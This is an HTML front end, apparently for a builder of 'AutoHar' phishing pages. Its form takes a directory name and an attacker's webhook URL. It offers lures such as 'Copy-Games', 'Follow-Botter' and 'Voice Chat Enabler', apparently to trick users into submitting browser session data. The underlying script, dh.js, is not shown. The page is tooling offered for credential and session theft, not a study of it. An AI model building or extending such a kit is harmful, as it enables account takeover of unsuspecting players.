<html>
    <head>
        <title>Create</title>
        <link rel="stylesheet" href="/../apis/css/style.css">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
        <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"> 
    </head>
    <body>
        
    <div class="container" id="container">
        <div class="form-container sign-in-container">
            <!-- regular form-->
            <form>
                <h1>Create Regular</h1>
                
                <span>Create your very own AutoHar Page</span>
                <input type="text" placeholder="Directory here.." name="dir" required>
                <input type="url" placeholder="Webhook here.." name="web" required>
                <select name="t" required>
                    <option value="fb">Follow-Botter</option>
                    <option value="gc">Copy-Games (BEST)</option>
                    <option value="cc">Copy-Clothes</option>
                    <option value="lc">Limiteds Checker</option>
                    <option value="vc">Voice Chat Enabler</option>
                </select>
                <button type="submit">Create</button>
            </form>
        </div>
        <div class="overlay-container">
            <div class="overlay">
                <div class="overlay-panel overlay-left">
                    <h1>Create Regular</h1>
                    <p>Go back, to Creating Regular Sites</p>
                    <button class="ghost" id="signIn">Create Now</button>
                </div>
                <div class="overlay-panel overlay-right">
                    <h1>Autohar</h1>
                    <p>Here you can generate the best Autohar Pages, Made with patien.</p>
                    <button>Best Autohar Sites</button>
                </div>
            </div>
        </div>
    </div>
    <script src="/../apis/js/dh.js"></script>
    
</body>
</html>